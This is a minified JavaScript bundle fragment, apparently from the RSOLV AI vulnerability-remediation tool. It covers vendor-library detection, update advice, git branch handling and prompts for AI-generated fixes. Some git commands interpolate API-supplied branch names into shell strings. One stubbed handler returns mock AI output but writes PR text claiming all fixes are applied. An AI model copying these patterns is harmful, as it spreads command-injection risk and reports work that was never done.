${Y}`),Y==="manual")return{success:!1,requiresManual:!0,guide:await this.generateManualGuide(Q),message:"This vulnerability requires manual intervention"};let W=await this.chunker.chunkVulnerability(Q);console.log(`[ChunkingIntegration] Created ${W.length} chunks`);let G=await this.prGenerator.generatePRSeries(W,J);return console.log(`[ChunkingIntegration] Generated ${G.length} PRs`),{success:!0,chunked:!0,chunks:W.length,prs:G,complexity:Y}}convertToMultiFile(X,J){let Q=X.files||X.filesToModify?.map((Y)=>({path:Y,lines:[],severity:X.severity||"MEDIUM"}))||[];return{type:X.type||"UNKNOWN",issueNumber:J,files:Q,requiresConfigChange:X.requiresConfigChange,requiresNewDependencies:X.requiresNewDependencies}}async generateManualGuide(X){let J=[];J.push("## Manual Intervention Required"),J.push(""),J.push(`This ${X.type} vulnerability is too complex for automated fixing.`),J.push(""),J.push("### Affected Files");for(let Q of X.files)J.push(`- ${Q.path}`);return J.push(""),J.push("### Recommended Steps"),J.push("1. Review all affected files for the vulnerability pattern"),J.push("2. Identify the root cause of the vulnerability"),J.push("3. Plan a comprehensive fix that addresses all instances"),J.push("4. Test thoroughly to ensure no functionality is broken"),J.push("5. Verify the vulnerability is fully resolved"),J.join(`
`)}}var PG=s(()=>{LG();pA();PG();t7()});import*as X5 from"path";import*as M6 from"fs/promises";class jJ{async parsePackageJson(X){let J=new Map;if(X.dependencies)Object.entries(X.dependencies).forEach(([Q,Y])=>{J.set(Q,Y)});if(X.devDependencies)Object.entries(X.devDependencies).forEach(([Q,Y])=>{J.set(Q,Y)});if(X.peerDependencies)Object.entries(X.peerDependencies).forEach(([Q,Y])=>{J.set(Q,Y)});return J}isKnownDependency(X,J){let Q=X.replace(/\\/g,"/");for(let[Y,W]of J){if(Q.includes(`node_modules/${Y}/`))return!0;if(Q.includes(`vendor/${Y}/`)||Q.includes(`vendor/${Y}.`)||Q.includes(`/${Y}-`)||Q.includes(`/${Y}.`))return!0}return!1}async findManifests(X="."){let J=[];try{let Q=X5.join(X,"package.json");try{await M6.access(Q),J.push({type:"npm",path:Q})}catch{}let Y=X5.join(X,"requirements.txt");try{await M6.access(Y),J.push({type:"python",path:Y})}catch{}let W=X5.join(X,"Gemfile");try{await M6.access(W),J.push({type:"ruby",path:W})}catch{}let G=X5.join(X,"composer.json");try{await M6.access(G),J.push({type:"php",path:G})}catch{}}catch(Q){console.error("Error finding manifests:",Q)}return J}async analyzeDependencies(X="."){let J=new Map,Q=await this.findManifests(X);for(let Y of Q)try{switch(Y.type){case"npm":{let W=await M6.readFile(Y.path,"utf-8"),G=JSON.parse(W),H=await this.parsePackageJson(G);J.set("npm",H);break}case"python":{let W=await M6.readFile(Y.path,"utf-8"),G=this.parseRequirementsTxt(W);J.set("pip",G);break}case"ruby":{let W=await M6.readFile(Y.path,"utf-8"),G=this.parseGemfile(W);J.set("gem",G);break}case"php":{let W=await M6.readFile(Y.path,"utf-8"),G=JSON.parse(W),H=this.parseComposerJson(G);J.set("composer",H);break}}}catch(W){console.error(`Error parsing ${Y.type} manifest:`,W)}return J}parseRequirementsTxt(X){let J=new Map,Q=X.split(`
`);for(let Y of Q){let W=Y.trim();if(W&&!W.startsWith("#")){let G=W.match(/^([a-zA-Z0-9-_]+)([><=~!]+)(.+)$/);if(G)J.set(G[1],G[2]+G[3]);else J.set(W,"*")}}return J}parseGemfile(X){let J=new Map,Q=X.split(`
`);for(let Y of Q){let G=Y.trim().match(/gem\s+['"]([^'"]+)['"]\s*(?:,\s*['"]([^'"]+)['"])?/);if(G)J.set(G[1],G[2]||"*")}return J}parseComposerJson(X){let J=new Map;if(X.require)Object.entries(X.require).forEach(([Q,Y])=>{if(!Q.startsWith("php"))J.set(Q,Y)});if(X["require-dev"])Object.entries(X["require-dev"]).forEach(([Q,Y])=>{J.set(Q,Y)});return J}}var RQ=()=>{};class OJ{detector;analyzer;constructor(X,J){this.detector=X;this.analyzer=J}async handle(X){if(await this.detector.isVendorFile(X.file)){let Q=await this.detector.identifyLibrary(X.file);if(Q)return{type:"vendor",action:"update",library:Q,report:{library:Q.name,currentVersion:Q.version,recommendedVersion:await this.getRecommendedVersion(Q,X),cve:X.cve,updateCommand:this.getUpdateCommand(Q),alternativeFix:this.getSafeWorkaround(X)}};else return{type:"vendor",action:"acknowledge",report:{library:"unknown",currentVersion:"unknown",recommendedVersion:"latest",updateCommand:"Manual update required",alternativeFix:"Review vendor library and update manually"}}}return{type:"application",action:"fix"}}async getRecommendedVersion(X,J){if(X.name==="jquery"){if(X.version.startsWith("3.5."))return"3.5.1";if(X.version.startsWith("3."))return"3.6.0";return"3.6.4"}if(X.name==="bootstrap"){if(X.version.startsWith("4."))return"4.6.2";return"5.3.0"}return"latest"}getUpdateCommand(X){let J=X.packageManager||"npm",Q=X.name;switch(J){case"npm":return`npm update ${Q}`;case"pip":return`pip install --upgrade ${Q}`;case"gem":return`bundle update ${Q}`;case"composer":return`composer update ${Q}`;default:return`${J} update ${Q}`}}getSafeWorkaround(X){switch(X.type){case"XXE":return"Disable external entity processing in XML parser configuration";case"XSS":return"Implement Content Security Policy (CSP) headers";case"SQL_INJECTION":return"Use parameterized queries or prepared statements";default:return}}async isVendorCode(X){return this.detector.isVendorFile(X)}async identifyLibrary(X){return this.detector.identifyLibrary(X)}async checkCVE(X,J){if(X.name==="jquery"&&J.type==="XXE")return"CVE-2020-11022";return J.cve}}class FJ{async recommendUpdate(X,J){let Q=X.version,Y=await this.findFixedVersions(X,J),W=this.getMinimumSafeVersion(X,Y),G=await this.checkBreakingChanges(Q,W),H=[];if(H.push({type:"patch",command:this.getUpdateCommand(X,"patch"),risk:"low",notes:"Bug fixes only, no breaking changes"}),G===!1||G===null)H.push({type:"minor",command:this.getUpdateCommand(X,"minor"),risk:"medium",notes:"New features, backward compatible"});return H.push({type:"major",command:this.getUpdateCommand(X,"major"),risk:"high",notes:G?"May require code changes":"Check changelog for breaking changes"}),{severity:J.severity||"MEDIUM",currentVersion:Q,fixedVersions:Y,minimumSafeVersion:W,breakingChanges:G,updateStrategies:H}}async findFixedVersions(X,J){if(X.name==="jquery"){if(X.version.startsWith("3.5.0"))return["3.5.1","3.6.0","3.6.4"]}if(X.name==="bootstrap"){if(X.version.startsWith("4."))return["4.6.2","5.0.0","5.3.0"]}let Q=X.version.split(".");if(Q.length>=3){let Y=parseInt(Q[0]),W=parseInt(Q[1]),G=parseInt(Q[2]);return[`${Y}.${W}.${G+1}`,`${Y}.${W+1}.0`,"latest"]}return["latest"]}getMinimumSafeVersion(X,J){if(J.length>0&&J[0]!=="latest")return J[0];if(X.name==="jquery"&&X.version.startsWith("3.5.0"))return"3.5.1";if(X.name==="bootstrap"&&X.version.startsWith("4."))return"4.6.2";return"latest"}async checkBreakingChanges(X,J){let Q=this.parseVersion(X),Y=this.parseVersion(J);if(!Q||!Y)return;if(Y.major>Q.major)return!0;return!1}parseVersion(X){if(X==="latest"||X==="unknown")return null;let J=X.match(/^(\d+)\.(\d+)\.(\d+)/);if(J)return{major:parseInt(J[1]),minor:parseInt(J[2]),patch:parseInt(J[3])};return null}getUpdateCommand(X,J){let Q=X.packageManager||"npm",Y=X.name;if(Q==="npm")switch(J){case"patch":return`npm update ${Y}`;case"minor":return`npm install ${Y}@^${X.version}`;case"major":return`npm install ${Y}@latest`}return`${Q} update ${Y}`}}class AQ{async createIssue(X){let J=this.generateTitle(X),Q=this.generateBody(X),Y=this.generateLabels(X);return{title:J,body:Q,labels:Y,createsPR:!1}}generateTitle(X){return`\uD83D\uDD12 Update ${X.library.name} to fix ${X.type} vulnerability`}generateBody(X){let J=[];if(J.push("## \uD83D\uDCE6 Vendor Library Vulnerability Detected"),J.push(""),J.push(`**Library**: ${X.library.name}`),J.push(`**Version**: ${X.library.version}`),J.push(`**File**: \`${X.file}\``),J.push(`**Vulnerability**: ${X.type}`),J.push(`**Severity**: ${X.severity}`),J.push(""),J.push("### \uD83D\uDD12 Security Details"),X.description)J.push(X.description);else J.push(`A ${X.severity.toLowerCase()} severity ${X.type} vulnerability was detected in ${X.library.name}.`);if(J.push(""),X.cve)J.push(`**CVE**: ${X.cve}`),J.push("");if(J.push("### \uD83D\uDD27 Recommended Actions"),J.push(""),J.push("#### Option 1: Update Library (Recommended)"),J.push("```bash"),J.push(X.updateCommand||`npm update ${X.library.name}`),J.push("```"),X.recommendedVersion)J.push(`This will update to version ${X.recommendedVersion} which fixes this vulnerability.`);if(J.push(""),X.workaround)J.push("#### Option 2: Workaround"),J.push(X.workaround),J.push("");else J.push("#### Option 2: Workaround"),J.push("No safe workaround available. Library update required."),J.push("");if(J.push("#### Option 3: Accept Risk"),J.push("If this is a false positive or the risk is acceptable for your use case, you can:"),J.push("1. Add this file to `.rsolvignore`"),J.push(`2. Mark this issue as "won't fix"`),J.push(""),J.push("### \uD83D\uDCDA References"),X.advisoryUrl)J.push(`- [${X.library.name} Security Advisories](${X.advisoryUrl})`);if(J.push(`- [NPM Audit Report](https://www.npmjs.com/advisories/search?q=${X.library.name})`),X.cve)J.push(`- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=${X.cve})`);return J.push(""),J.push("### ⚠️ Important Note"),J.push("**Do not manually patch vendor library files.** Changes will be lost when the library updates."),J.push(""),J.push("---"),J.push("*This issue was created by RSOLV vulnerability scanner*"),J.push("*Vendor libraries require different handling than application code*"),J.join(`
`)}generateLabels(X){let J=["security","vendor-library","dependency-update"];if(J.push(X.severity.toLowerCase()),X.type)J.push(X.type.toLowerCase().replace(/_/g,"-"));if(X.library.name)J.push(`lib:${X.library.name}`);return J}}var rA=s(()=>{S7();RQ()});class SG{detector;analyzer;handler;recommender;constructor(){this.detector=new ZX,this.analyzer=new jJ,this.handler=new OJ(this.detector,this.analyzer),this.recommender=new FJ}async isVendorFile(X){return this.detector.isVendorFile(X)}async processVulnerability(X){console.log("[VendorDetectionIntegration] Processing vendor vulnerability");let J=X.vendorFiles||[],Q=await this.identifyLibrary(J[0]),Y=await this.recommender.recommendUpdate(Q,X);return{action:"issue_created",type:"vendor_update",library:Q.name,currentVersion:Q.version,recommendedVersion:Y.minimumSafeVersion,updateCommand:Y.updateStrategies[0]?.command,message:`Vendor library ${Q.name} needs update from ${Q.version} to ${Y.minimumSafeVersion}`,recommendation:Y}}async identifyLibrary(X){let J=X.split("/"),Q="unknown",Y="unknown";if(X.includes("jquery")){Q="jquery";let W=X.match(/jquery[.-]?([\d.]+)/);if(W)Y=W[1]}else if(X.includes("bootstrap")){Q="bootstrap";let W=X.match(/bootstrap[.-]?([\d.]+)/);if(W)Y=W[1]}else if(X.includes("node_modules/")){let W=X.match(/node_modules\/([^/]+)/);if(W)Q=W[1]}return{name:Q,version:Y,path:X}}}var aA=s(()=>{S7();RQ()});var nA={};N0(nA,{VendorVulnerabilityHandler:()=>OJ,VendorIssueCreator:()=>AQ,VendorDetector:()=>ZX,VendorDetectionIntegration:()=>SG,UpdateRecommender:()=>FJ,DependencyAnalyzer:()=>jJ});var sA=s(()=>{S7();RQ();aA();rA()});var tA={};N0(tA,{ExtendedConversationIntegration:()=>oA,ExtendedConversationHandler:()=>TG});class TG{config;constructor(X){this.config={maxFilesPerConversation:20,maxTokensPerConversation:150000,conversationStrategy:"grouped",includeContext:!0,...X}}async processMultiFileVulnerability(X,J,Q){console.log(`[ExtendedConversation] Processing ${J.length} files in single conversation`);let Y=await this.buildContext(X,J),W=this.createConversationPlan(X,J),G=await this.executeExtendedConversation(X,Y,W,Q);return{success:!0,prUrl:(await this.generateComprehensivePR(G,X,Q)).url,message:`Fixed ${J.length} files in single PR using extended conversation`,stats:{filesProcessed:J.length,conversationTurns:G.turns,tokensUsed:G.totalTokens||0}}}async buildContext(X,J){let Q={vulnerabilityType:X.type,severity:X.severity,description:X.description,files:[],relatedFiles:[],dependencies:new Map};for(let Y of J){let W=await this.loadFileContent(Y),G=await this.analyzeDependencies(Y,W);Q.files.push({path:Y,content:W,vulnerabilityLocations:X.locations?.filter((H)=>H.file===Y)}),Q.dependencies.set(Y,G)}if(this.config.includeContext){let Y=await this.findRelatedFiles(J,Q.dependencies);for(let W of Y){let G=await this.loadFileContent(W);Q.relatedFiles.push({path:W,content:G})}}return Q}createConversationPlan(X,J){let Q={strategy:this.config.conversationStrategy,phases:[]};switch(this.config.conversationStrategy){case"sequential":Q.phases=J.map((G,H)=>({phase:H+1,description:`Fix vulnerability in ${G}`,files:[G],dependencies:[]}));break;case"grouped":let Y=this.groupRelatedFiles(J,X);Q.phases=Y.map((G,H)=>({phase:H+1,description:`Fix vulnerability in ${G.name}`,files:G.files,dependencies:G.dependencies}));break;case"prioritized":let W=this.prioritizeFiles(J,X);Q.phases=[{phase:1,description:"Fix critical vulnerabilities",files:W.critical},{phase:2,description:"Fix remaining vulnerabilities",files:W.remaining}];break}return Q}async executeExtendedConversation(X,J,Q,Y){let W={turns:0,totalTokens:0,messages:[],fixes:[]},G=this.buildInitialPrompt(X,J,Q),H=await this.generateAIResponse(G);W.turns++,W.totalTokens+=1000,W.messages.push({role:"assistant",content:H});for(let V of Q.phases){console.log(`[ExtendedConversation] Processing phase ${V.phase}: ${V.description}`);let K=this.buildPhasePrompt(V,J),Z=W.messages.map((B)=>`${B.role==="user"?"User":"Assistant"}: ${B.content}`).join(`

`)+`

User: `+K;H=await this.generateAIResponse(Z),W.turns++,W.totalTokens+=1000,W.messages.push({role:"assistant",content:H});let q=this.extractFixes(H,V.files);if(W.fixes.push(...q),W.totalTokens>this.config.maxTokensPerConversation*0.8){console.log("[ExtendedConversation] Approaching token limit, finalizing conversation");break}}let z=this.buildReviewPrompt(W.fixes),$=W.messages.map((V)=>`${V.role==="user"?"User":"Assistant"}: ${V.content}`).join(`

`)+`

User: `+z;return H=await this.generateAIResponse($),W.turns++,W.totalTokens+=1000,W}async generateComprehensivePR(X,J,Q){let Y=this.buildPRBody(X,J,Q);for(let G of X.fixes)await this.applyFix(G);return await this.createPullRequest({title:`[RSOLV] Fix ${J.type} vulnerability across ${X.fixes.length} files`,body:Y,branch:`rsolv/fix-issue-${Q}`,files:X.fixes.map((G)=>G.file)})}async loadFileContent(X){return""}async analyzeDependencies(X,J){return[]}async findRelatedFiles(X,J){return[]}groupRelatedFiles(X,J){return[]}prioritizeFiles(X,J){return{critical:[],remaining:[]}}buildInitialPrompt(X,J,Q){return`
You are fixing a ${X.type} vulnerability that affects ${J.files.length} files.

VULNERABILITY DETAILS:
${X.description}

AFFECTED FILES:
${J.files.map((Y)=>`- ${Y.path}`).join(`
`)}

PLAN:
We'll fix this systematically across all files in a single PR. 
${Q.phases.map((Y)=>`Phase ${Y.phase}: ${Y.description}`).join(`
`)}

Let's start by understanding the vulnerability pattern across all files.
Please analyze the following files and identify the common vulnerability pattern:

${J.files.slice(0,3).map((Y)=>`
File: ${Y.path}
\`\`\`
${Y.content.substring(0,1000)}
\`\`\`
`).join(`
`)}

What's the consistent pattern we need to fix across all files?
    `}buildPhasePrompt(X,J){return`
Now let's fix the vulnerability in phase ${X.phase}: ${X.description}

Files to fix:
${X.files.join(`
`)}

Please provide the fixes for each file, ensuring consistency with previous fixes.
    `}buildReviewPrompt(X){return`
Let's review all ${X.length} fixes for consistency and completeness.

Please verify:
1. All fixes follow the same pattern
2. No security issues are introduced
3. The code remains functional
4. All vulnerable patterns are addressed

Provide a final summary of the changes.
    `}extractFixes(X,J){return[]}buildPRBody(X,J,Q){return`
## \uD83D\uDD12 Security Fix: ${J.type}

Fixes #${Q}

### \uD83D\uDCCA Summary
- **Files Fixed**: ${X.fixes.length}
- **Vulnerability Type**: ${J.type}
- **Severity**: ${J.severity}
- **Conversation Turns**: ${X.turns}
- **Approach**: Extended conversation with comprehensive context

### \uD83D\uDD27 Changes Made
${X.fixes.map((Y)=>`- ✅ ${Y.file||"Unknown file"}: Fixed vulnerability`).join(`
`)}

### \uD83E\uDDEA Testing
- All changes made in a single, coherent PR
- Consistent fix pattern applied across all files
- No breaking changes introduced

### \uD83D\uDCDD Technical Details
This fix was generated using an extended conversation approach, processing all ${X.fixes.length} files 
in a single Claude conversation rather than splitting into multiple PRs. This ensures consistency 
and maintains context across all changes.

---
\uD83E\uDD16 Fixed by RSOLV using Extended Conversation Approach
    `}async applyFix(X){}async createPullRequest(X){return{url:""}}async generateAIResponse(X){return console.log("[ExtendedConversation] Generating AI response for prompt length:",X.length),`Mock response for extended conversation. 
    This would contain the actual fix for the vulnerability across all files.
    The real implementation would use the AI provider to generate comprehensive fixes.`}}class oA{handler;constructor(X){this.handler=new TG(X)}shouldUseExtendedConversation(X){let J=X.files?.length||X.filesToModify?.length||1;return J>1&&J<=20}async processWithExtendedConversation(X,J){let Q=X.files||X.filesToModify||[];console.log(`[ExtendedConversation] Processing ${Q.length} files in single conversation`);try{let Y=await this.handler.processMultiFileVulnerability(X,Q,J);return{success:!0,action:"pr_created",prUrl:Y.prUrl,message:Y.message,stats:Y.stats}}catch(Y){return console.error("[ExtendedConversation] Error:",Y),{success:!1,action:"failed",error:Y instanceof Error?Y.message:String(Y),message:"Extended conversation failed, may need manual intervention"}}}}var XD={};N0(XD,{hasFileInformation:()=>Ix1,extractFilesFromVulnerabilities:()=>Lx1});function Lx1(X,J="unknown"){if(!Array.isArray(X)||X.length===0)return U.debug(`[${J}] No vulnerabilities to extract files from`),[];let Q=[];X.forEach((W,G)=>{let H=eA(W);if(H.length===0)U.warn(`[${J}] Could not extract files from vulnerability ${G}:`,{vulnerabilityKeys:Object.keys(W),vulnerabilityType:W?.type,vulnerabilityString:JSON.stringify(W).substring(0,200)});else U.debug(`[${J}] Extracted ${H.length} files from vulnerability ${G}:`,H);Q.push(...H)});let Y=[...new Set(Q)];return U.info(`[${J}] Total files extracted from ${X.length} vulnerabilities:`,{totalFiles:Y.length,files:Y}),Y}function eA(X){if(!X||typeof X!=="object")return[];if("file"in X&&typeof X.file==="string")return[X.file];if("files"in X&&Array.isArray(X.files))return X.files.filter((J)=>typeof J==="string");if("path"in X&&typeof X.path==="string")return[X.path];if("filePath"in X&&typeof X.filePath==="string")return[X.filePath];if("location"in X&&typeof X.location==="object"){let J=X.location;if(J.file&&typeof J.file==="string")return[J.file];if(J.path&&typeof J.path==="string")return[J.path]}if("filename"in X&&typeof X.filename==="string")return[X.filename];if("fileName"in X&&typeof X.fileName==="string")return[X.fileName];return[]}function Ix1(X){if(!X||typeof X!=="object")return!1;return eA(X).length>0}var JD=s(()=>{I1()});import{exec as Cx1}from"child_process";import{promisify as Px1}from"util";class _G{async runTest(X){try{let{stdout:J,stderr:Q}=await QD(X);return{passed:!0,output:J+Q}}catch(J){return{passed:!1,output:J.stdout+J.stderr}}}async validate(){try{return await QD("npm test --version"),!0}catch{return!1}}}var QD;var YD=s(()=>{QD=Px1(Cx1)});function WD(X,J,Q){return`${Q||`Fix the security vulnerability for issue ${X.issueId}: "${X.title}"

Issue Description:
${X.description}`}

The following test validates the expected behavior:
Test file: ${J.testPath}
${J.testFramework?`Framework: ${J.testFramework}`:""}
${J.testCommand?`Run command: ${J.testCommand}`:""}

\`\`\`javascript
${J.testContent}
\`\`\`

This test currently FAILS (RED phase) and must PASS after your fix.

Requirements:
1. Your fix must make this test pass
2. Preserve all existing behavioral contracts
3. Make minimal, incremental changes
4. The fix should address the root cause, not just the symptoms
`}var HD={};N0(HD,{MitigationMode:()=>GD});import{execSync as Q9,exec as Sx1}from"child_process";import*as u6 from"fs";import*as DQ from"path";class GD{config;repoPath;phaseDataClient;constructor(X,J,Q){if(this.config=X,this.repoPath=J||process.cwd(),this.phaseDataClient=Q,X.environmentVariables&&typeof X.environmentVariables==="object")Object.entries(X.environmentVariables).forEach(([Y,W])=>{if(typeof W==="string")process.env[Y]=W,U.debug(`Applied environment variable: ${Y}`)})}getCurrentCommitSha(){try{return Q9("git rev-parse HEAD",{cwd:this.repoPath,encoding:"utf8"}).trim()}catch(X){return U.warn(`Could not get current commit SHA: ${X}`),"unknown"}}async getValidationBranchName(X){return this.phaseDataClient?this.getFromApi(X):this.getFromLocalFile(X)}async getFromApi(X){try{let J=`${X.repository.owner}/${X.repository.name}`,Y=(await this.phaseDataClient.retrievePhaseResults(J,X.number,this.getCurrentCommitSha()))?.validate?.[`issue-${X.number}`]?.branchName;if(Y)U.info(`Found validation branch via API: ${Y}`);return Y}catch(J){U.error(`API retrieval failed (production mode): ${J}`);return}}getFromLocalFile(X){try{let J=DQ.join(this.repoPath,".rsolv","validation",`issue-${X.number}.json`);if(!u6.existsSync(J))return;let Q=JSON.parse(u6.readFileSync(J,"utf8"));if(Q.branchName)U.info(`Found validation branch in local file (testing mode): ${Q.branchName}`);return Q.branchName}catch(J){U.warn(`Local file read failed (testing mode): ${J}`);return}}async checkoutValidationBranch(X){let J=this.getCurrentBranch();try{let Q=await this.getValidationBranchName(X);if(!Q)return U.info("No validation branch found, staying on current branch"),!1;let Y=this.doesLocalBranchExist(Q);try{Q9(`git fetch origin ${Q}`,{cwd:this.repoPath,stdio:"pipe"}),U.info(`Fetched validation branch from remote: ${Q}`)}catch(H){U.debug(`Could not fetch validation branch from remote: ${H}`)}let W=this.doesRemoteBranchExist(Q);if(!Y&&!W)return U.info(`Validation branch ${Q} does not exist locally or remotely, staying on current branch`),!1;if(Y)try{return Q9(`git checkout ${Q}`,{cwd:this.repoPath,stdio:"pipe"}),U.info(`Checked out local validation branch: ${Q}`),!0}catch(H){U.warn(`Failed to checkout local branch ${Q}: ${H}`);try{Q9(`git checkout ${J}`,{cwd:this.repoPath,stdio:"pipe"})}catch{}}if(W)try{return Q9(`git checkout -t origin/${Q}`,{cwd:this.repoPath,stdio:"pipe"}),U.info(`Checked out remote validation branch: origin/${Q}`),!0}catch(H){U.warn(`Failed to checkout validation branch from remote: ${H}`);try{Q9(`git checkout ${J}`,{cwd:this.repoPath,stdio:"pipe"})}catch{}return!1}let G=this.doesLocalBranchExist(Q);if(!Y&&G){U.warn(`Branch ${Q} was created accidentally, cleaning up`);try{if(this.getCurrentBranch()!==J)Q9(`git checkout ${J}`,{cwd:this.repoPath,stdio:"pipe"});Q9(`git branch -D ${Q}`,{cwd:this.repoPath,stdio:"pipe"}),U.info(`Deleted accidentally created branch: ${Q}`)}catch(H){U.debug(`Could not clean up accidentally created branch: ${H}`)}}return!1}catch(Q){U.error(`Error checking out validation branch for issue #${X.number}:`,Q);try{Q9(`git checkout ${J}`,{cwd:this.repoPath,stdio:"pipe"})}catch{}return!1}}doesLocalBranchExist(X){try{return Q9("git branch --list",{cwd:this.repoPath,encoding:"utf8"}).split(`
`).map((Q)=>Q.trim().replace(/^\*\s+/,"")).includes(X)}catch(J){return U.debug(`Error checking local branches: ${J}`),!1}}doesRemoteBranchExist(X){try{return Q9("git branch -r",{cwd:this.repoPath,encoding:"utf8",stdio:"pipe"}).split(`
`).map((Q)=>Q.trim().replace(/^origin\//,"")).includes(X)}catch(J){return U.debug(`Error checking remote branches: ${J}`),!1}}async getValidationTests(X){let J=DQ.join(this.repoPath,".rsolv","tests");if(!u6.existsSync(J))return[];try{return u6.readdirSync(J).filter((Q)=>Q.endsWith(".test.js")).map((Q)=>DQ.join(J,Q))}catch(Q){return U.warn(`Could not read test directory: ${Q}`),[]}}async generateTestAwareFix(X){try{let J=jQ.checkVendorStatusFromValidation(this.repoPath,X.number);if(J.isVendor)return{skipReason:"vendor_file",message:"Cannot patch vendor library - update required",vendorFiles:J.files,branchCheckedOut:!1,testFilesFound:0,enhancedPrompt:void 0};let Q=await this.checkoutValidationBranch(X),W=(await this.getValidationTests(X)).map((H)=>{try{return{path:H,content:u6.readFileSync(H,"utf-8")}}catch(z){return U.warn(`Could not read test file ${H}:`,z),null}}).filter(Boolean),G=this.buildLegacyTestAwarePrompt(X,W);return U.info(`Generated test-aware mitigation prompt for issue #${X.number}`),U.info(`- Validation branch: ${Q?"checked out":"not available"}`),U.info(`- Test files found: ${W.length}`),{branchCheckedOut:Q,testFilesFound:W.length,enhancedPrompt:G,testContents:W}}catch(J){throw U.error(`Test-aware fix generation failed for issue #${X.number}:`,J),J}}async prepareTestContext(X){if(!this.phaseDataClient)throw Error("PhaseDataClient not configured for test-aware mitigation");let J=await this.phaseDataClient.getPhaseTestInfo(X);return U.info(`Checking out validation branch: ${J.branchName}`),await new Promise((Y,W)=>{Sx1(`git checkout ${J.branchName}`,(G)=>{if(G)W(G);else Y()})}),{testContent:u6.readFileSync(J.testPath,"utf-8"),testPath:J.testPath,branchName:J.branchName}}async buildTestAwarePrompt(X,J){let Q=await this.prepareTestContext(X);return WD({issueId:X,title:"",description:""},{testPath:Q.testPath,testContent:Q.testContent},J)}async runPreFixTest(X){return this.runTestForIssue(X)}async runPostFixTest(X){return this.runTestForIssue(X)}async runTestForIssue(X){if(!this.phaseDataClient)throw Error("PhaseDataClient not configured");let J=await this.phaseDataClient.getPhaseTestInfo(X);return await new _G().runTest(J.command)}async saveTestResults(X){if(!this.phaseDataClient)throw Error("PhaseDataClient not configured");await this.phaseDataClient.saveTestResults(X)}async calculateTrustScore(X,J){if(!X&&J)return 100;else if(X&&J)return 50;else return 0}async runTestSafely(X){try{return await this.runTestForIssue(X)}catch(J){return{passed:!1,error:J.message}}}buildLegacyTestAwarePrompt(X,J){let Q=`
Fix the security vulnerability described in issue #${X.number}: "${X.title}"

Issue Description:
${X.body}
`;if(J.length===0)return U.info("No validation tests found, using standard prompt"),Q;let Y=`
VALIDATION TESTS AVAILABLE:
The following tests define the expected behavior and vulnerability patterns.
These tests currently FAIL on the vulnerable code and should PASS after your fix:

${J.map((W)=>`
File: ${W.path}
\`\`\`javascript
${W.content}
\`\`\`
`).join(`
`)}

REQUIREMENTS:
1. Your fix must make these tests pass
2. Preserve all existing behavioral contracts tested
3. Make minimal, incremental changes
4. You can run these tests locally to validate your fix using: npm test

`;return Q+Y}getCurrentBranch(){try{return Q9("git branch --show-current",{cwd:this.repoPath,encoding:"utf8"}).trim()}catch(X){return U.warn(`Could not get current branch: ${X}`),"main"}}async createPRFromValidationBranch(X){try{let J=this.getCurrentBranch();if(!J.startsWith("rsolv/validate/"))return U.warn(`Not on validation branch (${J}), cannot create PR with tests`),{success:!1,reason:"Not on validation branch"};if(Q9("git status --porcelain",{cwd:this.repoPath,encoding:"utf8"}).trim())Q9("git add .",{cwd:this.repoPath}),Q9(`git commit -m "Fix vulnerability for issue #${X.number}

✅ Generated with RSOLV three-phase workflow
\uD83E\uDDEA Includes validation tests from ${J}"`,{cwd:this.repoPath}),U.info(`Committed fix to validation branch: ${J}`);let Y=`\uD83D\uDD12 Fix security vulnerability: ${X.title}`,W=`
## Security Fix for Issue #${X.number}

**Vulnerability**: ${X.title}

### \uD83D\uDCCB Changes Made
- Fixed security vulnerability identified in issue #${X.number}
- Generated using RSOLV three-phase workflow (Scan → Validate → Mitigate)

### \uD83E\uDDEA Validation Tests Included
This PR includes validation tests that:
- ✅ Prove the vulnerability existed (red tests)
- ✅ Verify the fix resolves the issue (green tests)
- ✅ Prevent regression

### \uD83D\uDD27 Test-Aware Fix Generation
The fix was generated using AI with access to validation tests, ensuring:
- Behavioral contracts are preserved
- Minimal, focused changes
- Test-driven approach

**Branch**: \`${J}\`
**Issue**: #${X.number}

---
\uD83E\uDD16 Generated with [RSOLV](https://rsolv.app) - AI-powered vulnerability remediation
      `.trim();return U.info(`Creating PR from validation branch: ${J}`),U.info(`PR Title: ${Y}`),{success:!0,branch:J,title:Y,body:W,hasTests:!0,message:`PR ready to be created from validation branch ${J}`}}catch(J){return U.error("Failed to create PR from validation branch:",J),{success:!1,error:J instanceof Error?J.message:String(J)}}}}var zD=s(()=>{I1();AG();YD()});class EG{generateLineLevelExplanation(X,J){let Q=`Line ${X.line}: ${this.getVulnerabilityDisplayName(X.type)} Vulnerability`,Y=this.generateLineLevelContent(X,J),W=this.generateSecureExample(X.type,J);return{tier:"line",vulnerabilityId:`${X.type}-${X.line}`,title:Q,content:Y,secureExample:W,riskLevel:X.severity,lineNumber:X.line,codeSnippet:J}}generateConceptLevelExplanation(X,J){let Q=`Understanding ${this.getVulnerabilityDisplayName(X)}`,Y=this.generateConceptLevelContent(X),W=this.getPreventionMethods(X),G=this.getAttackScenarios(X),H=this.getRelatedConcepts(X);return{tier:"concept",vulnerabilityType:X,title:Q,content:Y,preventionMethods:W,attackScenarios:G,relatedConcepts:H,affectedVulnerabilities:J.filter((z)=>z.type===X)}}generateBusinessLevelExplanation(X){let J=this.calculateRiskScore(X),Q=this.analyzeBusinessImpact(X),Y=this.analyzeComplianceImpact(X),W=this.determinePriorities(X),G=this.estimateTimeline(X);return{tier:"business",title:"Security Risk Assessment and Business Impact",content:this.generateBusinessLevelContent(X),businessImpact:Q,complianceImpact:Y,riskScore:J,priorities:W,timeline:G}}generateCompleteExplanation(X,J){let Q=[];for(let z of X){let $=this.extractCodeSnippet(z,J);Q.push(this.generateLineLevelExplanation(z,$))}let W=[...new Set(X.map((z)=>z.type))].map((z)=>this.generateConceptLevelExplanation(z,X)),G=this.generateBusinessLevelExplanation(X),H=this.generateSummary(X);return{lineLevelExplanations:Q,conceptLevelExplanations:W,businessLevelExplanation:G,summary:H,timestamp:new Date().toISOString()}}formatAsMarkdown(X){if(X.tier==="line")return this.formatLineLevelMarkdown(X);else if(X.tier==="concept")return this.formatConceptLevelMarkdown(X);else return this.formatBusinessLevelMarkdown(X)}generateMarkdownReport(X){let J=`# Security Vulnerability Explanation

`;J+=`**Generated:** ${new Date(X.timestamp).toLocaleDateString()}

`,J+=`## Summary

`,J+=`- **Total Vulnerabilities:** ${X.summary.totalVulnerabilities}
`,J+=`- **Estimated Fix Time:** ${X.summary.estimatedFixTime}
`,J+=`- **Risk Score:** ${X.businessLevelExplanation.riskScore}/100

`,J+=`## Line-Level Analysis

